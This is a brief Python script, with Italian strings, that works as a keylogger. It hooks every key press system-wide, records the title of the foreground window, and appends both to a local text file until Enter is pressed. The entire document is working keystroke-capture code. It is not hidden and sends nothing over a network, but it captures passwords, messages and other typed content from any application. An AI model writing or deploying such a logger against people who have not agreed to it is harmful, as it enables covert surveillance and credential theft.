import keyboard
import win32gui

filename = "tasti_e_finestre.txt"
cur_handle = win32gui.GetForegroundWindow()
prev_handle = cur_handle


def on_key_press(event):
    with open(filename, "a") as file:
        file.write(event.name + " - " + win32gui.GetWindowText(win32gui.GetForegroundWindow()) + "\n")

keyboard.on_press(on_key_press)

input("Premi Enter per interrompere la registrazione dei tasti e delle finestre...")

keyboard.unhook_all()
